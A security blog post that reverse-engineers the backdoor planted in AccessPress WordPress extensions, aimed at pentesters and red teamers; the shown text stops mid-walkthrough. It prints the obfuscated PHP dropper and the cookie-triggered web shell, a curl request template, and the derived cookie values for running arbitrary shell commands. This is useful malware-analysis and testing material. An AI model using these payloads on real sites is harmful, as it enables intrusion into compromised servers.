<!doctype html><html lang="en" data-mode="dark"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Reversing a WordPress Backdoor" /><meta property="og:locale" content="en" /><meta name="description" content="On January 18th, 2022, Jetpack published their discovery of a supply chain attack affecting 93 WordPress themes and plugins. An organization called AccessPress Themes had been breached in the first half of September 2021, and the extensions available for download on their site were injected with a backdoor." /><meta property="og:description" content="On January 18th, 2022, Jetpack published their discovery of a supply chain attack affecting 93 WordPress themes and plugins. An organization called AccessPress Themes had been breached in the first half of September 2021, and the extensions available for download on their site were injected with a backdoor." /><link rel="canonical" href="https://www.redteamreadme.com/posts/wordpress-backdoor/" /><meta property="og:url" content="https://www.redteamreadme.com/posts/wordpress-backdoor/" /><meta property="og:site_name" content="Red Team README" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-02-01T17:00:00-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Reversing a WordPress Backdoor" /><meta name="twitter:site" content="@dnstun0" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-04-11T23:14:27-04:00","datePublished":"2022-02-01T17:00:00-05:00","description":"On January 18th, 2022, Jetpack published their discovery of a supply chain attack affecting 93 WordPress themes and plugins. An organization called AccessPress Themes had been breached in the first half of September 2021, and the extensions available for download on their site were injected with a backdoor.","headline":"Reversing a WordPress Backdoor","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.redteamreadme.com/posts/wordpress-backdoor/"},"url":"https://www.redteamreadme.com/posts/wordpress-backdoor/"}</script><title>Reversing a WordPress Backdoor | Red Team README</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Red Team README"><meta name="application-name" content="Red Team README"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.32.2/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"> <script src="/assets/js/dist/theme.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js,npm/tocbot@4.32.2/dist/tocbot.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/redteam.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a> <a class="site-title d-block" href="/">Red Team README</a><p class="site-subtitle fst-italic mb-0">Everything offensive security.</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <a href="https://github.com/dnstun0" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/dnstun0" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fab fa-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['dnstun0','protonmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/">Home</a> </span> <span>Reversing a WordPress Backdoor</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1" data-toc="true"><header><h1 data-toc-skip>Reversing a WordPress Backdoor</h1><div class="post-meta text-muted"> <span> Posted <time data-ts="1643752800" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Feb 1, 2022 </time> </span> <span> Updated <time data-ts="1744427667" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Apr 11, 2025 </time> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/dnstun0">dnstun0</a> </em> </span><div> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="1793 words" > <em>9 min</em> read</span></div></div></div></header><div id="toc-bar" class="d-flex align-items-center justify-content-between invisible"> <span class="label text-truncate">Reversing a WordPress Backdoor</span> <button type="button" class="toc-trigger btn me-1"> <i class="fa-solid fa-list-ul fa-fw"></i> </button></div><button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm"> <span class="label ps-2 pe-1">Contents</span> <i class="fa-solid fa-angle-right fa-fw"></i> </button> <dialog id="toc-popup" class="p-0"><div class="header d-flex flex-row align-items-center justify-content-between"><div class="label text-truncate py-2 ms-4">Reversing a WordPress Backdoor</div><button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75"> <i class="fas fa-close"></i> </button></div><div id="toc-popup-content" class="px-4 py-3 pb-4"></div></dialog><div class="content"><p>On January 18th, 2022, <a href="https://jetpack.com/">Jetpack</a> <a href="https://jetpack.com/2022/01/18/backdoor-found-in-themes-and-plugins-from-accesspress-themes/">published</a> their discovery of a supply chain attack affecting 93 WordPress themes and plugins. An organization called <a href="https://accesspressthemes.com/">AccessPress Themes</a> had been breached in the first half of September 2021, and the extensions available for download on their site were injected with a backdoor.</p><p>There are published YARA rules and other <a href="https://www.bleepingcomputer.com/news/security/over-90-wordpress-themes-plugins-backdoored-in-supply-chain-attack/">detection instructions</a> readily available for site owners to determine if they are vulnerable. But if you’re a bug bounty hunter, penetration tester, or red teamer there’s not much information on how to test for and exploit the backdoor. The rest of this article will cover how to reverse engineer the backdoor and use it to obtain a web shell on a vulnerable host.</p><h2 id="dropper"><span class="me-2">Dropper</span><a href="#dropper" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>First, we’ll take a look at the dropper. The compromised extensions were modified to include a dropper function in the <em>initial.php</em> file of the main plugin or theme directory. When run, it installs a web shell in <em>wp-includes/vars.php</em>.</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="mo">01</span>  <span class="k">function</span> <span class="n">makeInit</span><span class="p">()</span> <span class="p">{</span>
<span class="mo">02</span>     <span class="nv">$b64</span> <span class="o">=</span> <span class="s1">'ba'</span> <span class="mf">.</span> <span class="s1">'se64'</span> <span class="mf">.</span> <span class="s1">'_dec'</span> <span class="mf">.</span> <span class="s1">'ode'</span><span class="p">;</span>
<span class="mo">03</span>     <span class="nv">$b</span> <span class="o">=</span> <span class="s1">'ZnVuY3Rpb2........TsKCg=='</span><span class="p">;</span>
<span class="mo">04</span>
<span class="mo">05</span>     <span class="nv">$f</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'DOCUMENT_ROOT'</span><span class="p">]</span> <span class="mf">.</span> <span class="s1">'/wp-includes/vars.php'</span><span class="p">;</span>
<span class="mo">06</span>     <span class="k">if</span><span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span>
<span class="mo">07</span>         <span class="nv">$fp</span> <span class="o">=</span> <span class="mo">0777</span> <span class="o">&amp;</span> <span class="o">@</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
<span class="mi">08</span>         <span class="nv">$ft</span> <span class="o">=</span> <span class="o">@</span><span class="nb">filemtime</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
<span class="mi">09</span>         <span class="nv">$fc</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
<span class="mi">10</span>         <span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$fc</span><span class="p">,</span> <span class="s1">'wp_is_mobile_fix'</span><span class="p">)</span> <span class="o">===</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
<span class="mi">11</span>             <span class="nv">$fc</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'function wp_is_mobile()'</span><span class="p">,</span>
<span class="mi">12</span>                <span class="nv">$b64</span><span class="p">(</span><span class="nv">$b</span><span class="p">)</span> <span class="mf">.</span> <span class="s1">'function wp_is_mobile()'</span><span class="p">,</span>
<span class="mi">13</span>                <span class="nv">$fc</span><span class="p">);</span>
<span class="mi">14</span>            <span class="o">@</span><span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span> <span class="nv">$fc</span><span class="p">);</span>
<span class="mi">15</span>            <span class="o">@</span><span class="nb">touch</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span> <span class="nv">$ft</span><span class="p">);</span>
<span class="mi">16</span>            <span class="o">@</span><span class="nb">chmod</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span> <span class="nv">$fp</span><span class="p">);</span>
<span class="mi">17</span>        <span class="p">}</span>
<span class="mi">18</span>        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
<span class="mi">19</span>    <span class="p">}</span>
<span class="mi">20</span>    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
<span class="mi">21</span>  <span class="p">}</span>
</pre></table></code></div></div><p>Line two shows fragments of the <code class="language-plaintext highlighter-rouge">base64_decode</code> function name being concatenated together; probably to obfuscate its intent from any scanners. The actual web shell code is on line three, and is base64 encoded. The rest of the dropper checks for the existence of the <em>vars.php</em> file, sets its permissions wide open, inserts the backdoor, and then puts the file timestamp and permissions back the way they were.</p><h2 id="backdoor-web-shell"><span class="me-2">Backdoor Web Shell</span><a href="#backdoor-web-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>What did that dropper install? Decoding the base64 string reveals the following PHP code.</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="mo">01</span>  <span class="k">function</span> <span class="n">wp_is_mobile_fix</span><span class="p">()</span> <span class="p">{</span>
<span class="mo">02</span>      <span class="nv">$is_wp_mobile</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_USER_AGENT'</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'wp_is_mobile'</span><span class="p">);</span>
<span class="mo">03</span>      <span class="nv">$g</span> <span class="o">=</span> <span class="nv">$_COOKIE</span><span class="p">;</span>
<span class="mo">04</span>
<span class="mo">05</span>    <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$g</span><span class="p">)</span> <span class="o">==</span> <span class="mi">8</span> <span class="o">&amp;&amp;</span> <span class="nv">$is_wp_mobile</span><span class="p">)</span> <span class="o">?</span>
<span class="mo">06</span>    <span class="p">((</span><span class="nv">$qr</span> <span class="o">=</span> <span class="nv">$g</span><span class="p">[</span><span class="mi">33</span><span class="p">]</span><span class="mf">.</span><span class="nv">$g</span><span class="p">[</span><span class="mi">32</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$iv</span> <span class="o">=</span> <span class="nv">$qr</span><span class="p">(</span><span class="nv">$g</span><span class="p">[</span><span class="mi">78</span><span class="p">]</span><span class="mf">.</span><span class="nv">$g</span><span class="p">[</span><span class="mi">18</span><span class="p">]))</span> <span class="o">&amp;&amp;</span>
<span class="mo">07</span>    <span class="p">(</span><span class="nv">$_iv</span> <span class="o">=</span> <span class="nv">$qr</span><span class="p">(</span><span class="nv">$g</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span><span class="mf">.</span><span class="nv">$g</span><span class="p">[</span><span class="mi">17</span><span class="p">]))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$_iv</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$iv</span><span class="p">(</span><span class="nv">$g</span><span class="p">[</span><span class="mi">10</span><span class="p">],</span> <span class="nv">$_iv</span><span class="p">(</span><span class="nv">$qr</span><span class="p">(</span><span class="nv">$g</span><span class="p">[</span><span class="mi">53</span><span class="p">]))))</span> <span class="o">&amp;&amp;</span> 
<span class="mi">08</span>    <span class="o">@</span><span class="nv">$_iv</span><span class="p">())</span> <span class="o">:</span> <span class="nv">$g</span><span class="p">;</span>
<span class="mi">09</span>
<span class="mi">10</span>    <span class="k">return</span> <span class="nv">$is_wp_mobile</span><span class="p">;</span>
<span class="mi">11</span>  <span class="p">}</span>
<span class="mi">12</span>
<span class="mi">13</span>  <span class="nf">wp_is_mobile_fix</span><span class="p">();</span>
</pre></table></code></div></div><p>A quick glance tells us that using the backdoor will require a user agent string of <code class="language-plaintext highlighter-rouge">wp_is_mobile</code> and a cookie with eight values. Our final <code class="language-plaintext highlighter-rouge">curl</code> command will look something like this:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>curl <span class="nt">-v</span> <span class="nt">-A</span> <span class="s2">"wp_is_mobile"</span> <span class="nt">--cookie</span> <span class="s2">"33=; 32=; 78=; 18=; 12=; 17=; 10=; 53="</span> http://localhost/wp-includes/vars.php
</pre></table></code></div></div><p>Now comes the challenging part: de-obfuscating that mess on lines five through eight and filling in the cookie values.</p><h2 id="reverse-engineering-the-web-shell"><span class="me-2">Reverse Engineering the Web Shell</span><a href="#reverse-engineering-the-web-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>That question mark is a <a href="https://www.php.net/manual/en/language.operators.comparison.php">ternary operator</a>; which is essentially a shortened if-else statement. If we re-examine and rewrite it as pseudo-code it makes things a little easier to understand:</p><blockquote><p>IF there are eight cookie values AND the user agent is an expected value THEN perform a series of statements and return their value ELSE return the cookie array</p></blockquote><p>Since the result of this statement isn’t being stored or used, whatever the return value is doesn’t matter; and since the “else” just returns the cookie array, we can completely ignore that part of the statement. That leaves us with the comparison and the true condition. As mentioned before, to execute the series of statements we need eight cookie values and a user agent string of <code class="language-plaintext highlighter-rouge">wp_is_mobile</code>. That will cause the chain of statements in the true condition to execute. Let’s examine those now.</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">((</span><span class="nv">$qr</span> <span class="o">=</span> <span class="nv">$g</span><span class="p">[</span><span class="mi">33</span><span class="p">]</span><span class="mf">.</span><span class="nv">$g</span><span class="p">[</span><span class="mi">32</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$iv</span> <span class="o">=</span> <span class="nv">$qr</span><span class="p">(</span><span class="nv">$g</span><span class="p">[</span><span class="mi">78</span><span class="p">]</span><span class="mf">.</span><span class="nv">$g</span><span class="p">[</span><span class="mi">18</span><span class="p">]))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$_iv</span> <span class="o">=</span> <span class="nv">$qr</span><span class="p">(</span><span class="nv">$g</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span><span class="mf">.</span><span class="nv">$g</span><span class="p">[</span><span class="mi">17</span><span class="p">]))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$_iv</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$iv</span><span class="p">(</span><span class="nv">$g</span><span class="p">[</span><span class="mi">10</span><span class="p">],</span> <span class="nv">$_iv</span><span class="p">(</span><span class="nv">$qr</span><span class="p">(</span><span class="nv">$g</span><span class="p">[</span><span class="mi">53</span><span class="p">]))))</span> <span class="o">&amp;&amp;</span> <span class="o">@</span><span class="nv">$_iv</span><span class="p">())</span>
</pre></table></code></div></div><p>As you can see, there are several statements chained together with double ampersands. This is a <a href="https://en.wikipedia.org/wiki/Short-circuit_evaluation">short-circuit evaluation</a>, which means each statement will execute in sequence until one fails. This is an easy way to perform multiple actions in a single statement. To improve readability, we’ll rewrite these as separate statements.</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nv">$qr</span> <span class="o">=</span> <span class="nv">$g</span><span class="p">[</span><span class="mi">33</span><span class="p">]</span><span class="mf">.</span><span class="nv">$g</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
<span class="nv">$iv</span> <span class="o">=</span> <span class="nv">$qr</span><span class="p">(</span><span class="nv">$g</span><span class="p">[</span><span class="mi">78</span><span class="p">]</span><span class="mf">.</span><span class="nv">$g</span><span class="p">[</span><span class="mi">18</span><span class="p">]);</span>
<span class="nv">$_iv</span> <span class="o">=</span> <span class="nv">$qr</span><span class="p">(</span><span class="nv">$g</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span><span class="mf">.</span><span class="nv">$g</span><span class="p">[</span><span class="mi">17</span><span class="p">]);</span>
<span class="nv">$_iv</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$iv</span><span class="p">(</span><span class="nv">$g</span><span class="p">[</span><span class="mi">10</span><span class="p">],</span> <span class="nv">$_iv</span><span class="p">(</span><span class="nv">$qr</span><span class="p">(</span><span class="nv">$g</span><span class="p">[</span><span class="mi">53</span><span class="p">])));</span>
<span class="o">@</span><span class="nv">$_iv</span><span class="p">();</span>
</pre></table></code></div></div><p>We can further reduce the complexity by removing some more of the obfuscation. The shell seems to be avoiding possible WAF rules by splitting its input across pairs of parameters that are then concatenated back together. Let’s remove half of each pair and assume we’ll be passing an empty string for the removed half. (e.g. <code class="language-plaintext highlighter-rouge">"str"."ing"</code> becomes <code class="language-plaintext highlighter-rouge">"string".""</code>)</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="mo">01</span>  <span class="nv">$qr</span> <span class="o">=</span> <span class="nv">$g</span><span class="p">[</span><span class="mi">33</span><span class="p">];</span>
<span class="mo">02</span>  <span class="nv">$iv</span> <span class="o">=</span> <span class="nv">$qr</span><span class="p">(</span><span class="nv">$g</span><span class="p">[</span><span class="mi">78</span><span class="p">]);</span>
<span class="mo">03</span>  <span class="nv">$_iv</span> <span class="o">=</span> <span class="nv">$qr</span><span class="p">(</span><span class="nv">$g</span><span class="p">[</span><span class="mi">12</span><span class="p">]);</span>
<span class="mo">04</span>  <span class="nv">$_iv</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$iv</span><span class="p">(</span><span class="nv">$g</span><span class="p">[</span><span class="mi">10</span><span class="p">],</span> <span class="nv">$_iv</span><span class="p">(</span><span class="nv">$qr</span><span class="p">(</span><span class="nv">$g</span><span class="p">[</span><span class="mi">53</span><span class="p">])));</span>
<span class="mo">05</span>  <span class="o">@</span><span class="nv">$_iv</span><span class="p">();</span>
</pre></table></code></div></div><p>We’ve now reduced the code to a point where we need to start interpreting the logic. It appears that the cookie values are being used to construct function name strings. PHP allows you to use a variable as a function name, and when followed by parentheses and arguments, will attempt to look up the function and execute it. That’s exactly what this code is doing; we just need to guess what functions are being called to create a web shell.</p><p>The logic here is a bit tricky to describe, so here goes nothing. First, a function name is read from the cookie into <code class="language-plaintext highlighter-rouge">qr</code>. That function is then used to generate another function name from a cookie value and store it in <code class="language-plaintext highlighter-rouge">iv</code>. We do this again a third time with a different cookie value and store the result in <code class="language-plaintext highlighter-rouge">_iv</code>. Finally, we use the remaining two cookie values and the three computed function names to generate a final function name. That final function is then executed with no parameters.</p><p>What are these functions being specified in the cookie values? How do they work together to create a reverse shell? It would be <em>great</em> if we had some logs of an active attack so we could see the payloads used…but we don’t. So let’s see if we can figure it out ourselves.</p><p>I assumed the shell author needed three things: support for special characters (<a href="https://www.php.net/manual/en/function.base64-decode.php"><code class="language-plaintext highlighter-rouge">base64_decode</code></a>), execution of shell commands (<a href="https://www.php.net/manual/en/function.shell-exec.php"><code class="language-plaintext highlighter-rouge">shell_exec</code></a>), and printing the command output (<a href="https://www.php.net/manual/en/function.echo"><code class="language-plaintext highlighter-rouge">echo</code></a>). There was one problem with my assumptions: the functions for those three things all use one parameter. On line four above, you can see the <code class="language-plaintext highlighter-rouge">iv</code> function takes two.</p><p>After scouring the PHP documentation, I came across the <a href="https://www.php.net/manual/en/function.create-function.php"><code class="language-plaintext highlighter-rouge">create_function</code></a> function. There’s a big warning in the documentation that it’s been deprecated as of PHP 7.2.0, but it seemed to work on my local 7.4 version so I gave it a shot anyway. The <code class="language-plaintext highlighter-rouge">create_function</code> function takes two arguments: a string of arguments, and a string of PHP code. It then creates an anonymous (lambda-style) function that can be executed.</p><p>Now that we have a set of functions to work with that fit the required number of parameters, let’s see which ones we can overlay on the web shell code so it makes sense.</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="mo">01</span>  <span class="nv">$qr</span> <span class="o">=</span> <span class="s2">"base64_decode"</span><span class="p">;</span>
<span class="mo">02</span>  <span class="nv">$iv</span> <span class="o">=</span> <span class="nv">$qr</span><span class="p">(</span><span class="nb">base64_encode</span><span class="p">(</span><span class="s2">"create_function"</span><span class="p">));</span>
<span class="mo">03</span>  <span class="nv">$_iv</span> <span class="o">=</span> <span class="nv">$qr</span><span class="p">(</span><span class="nb">base64_encode</span><span class="p">(</span><span class="s2">"base64_decode"</span><span class="p">));</span>
<span class="mo">04</span>  <span class="nv">$_iv</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$iv</span><span class="p">(</span><span class="nv">$g</span><span class="p">[</span><span class="mi">10</span><span class="p">],</span> <span class="nv">$_iv</span><span class="p">(</span><span class="nv">$qr</span><span class="p">(</span><span class="nv">$g</span><span class="p">[</span><span class="mi">53</span><span class="p">])));</span>
<span class="mo">05</span>  <span class="o">@</span><span class="nv">$_iv</span><span class="p">();</span>
</pre></table></code></div></div><p>If we assume the cookie value <code class="language-plaintext highlighter-rouge">$g[33]</code> will be the string <code class="language-plaintext highlighter-rouge">base64_decode</code>, the values for <code class="language-plaintext highlighter-rouge">$iv</code> and <code class="language-plaintext highlighter-rouge">$_iv</code> will need to be base64 encoded so they decode to valid function names. Let’s rewrite line four and replace the variable names with their actual values.</p><blockquote><p>If you’re wondering why there’s an @ symbol in front of <code class="language-plaintext highlighter-rouge">$_iv</code>, it instructs PHP to suppress errors. Which, if you’re an attacker, you’d like to keep hidden from your target.</p></blockquote><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$_iv</span> <span class="o">=</span> <span class="o">@</span><span class="nb">create_function</span><span class="p">(</span><span class="nv">$g</span><span class="p">[</span><span class="mi">10</span><span class="p">],</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$g</span><span class="p">[</span><span class="mi">53</span><span class="p">])));</span>
</pre></table></code></div></div><p>The variable <code class="language-plaintext highlighter-rouge">$_iv</code> is reused here. We set it to <code class="language-plaintext highlighter-rouge">base64_decode</code> on line three. It is used in line four to compute a new value for itself. And then that computed value is called on line five.</p><p>We’ve almost got it! We just need to fill in those <code class="language-plaintext highlighter-rouge">create_function</code> arguments with cookie values that fit our algorithm.</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$_iv</span> <span class="o">=</span> <span class="o">@</span><span class="nb">create_function</span><span class="p">(</span><span class="s2">""</span><span class="p">,</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="s2">"WldOb2J5QnphR1ZzYkY5bGVHVmpLQ2R3ZDJRbktUcz0="</span><span class="p">)));</span>
</pre></table></code></div></div><p>An empty string indicating no parameters and a double encoded string will do it. The double encoded string can be any PHP code you want to execute. In this example, I’m printing the current working directory.</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">echo</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="s1">'pwd'</span><span class="p">);</span>
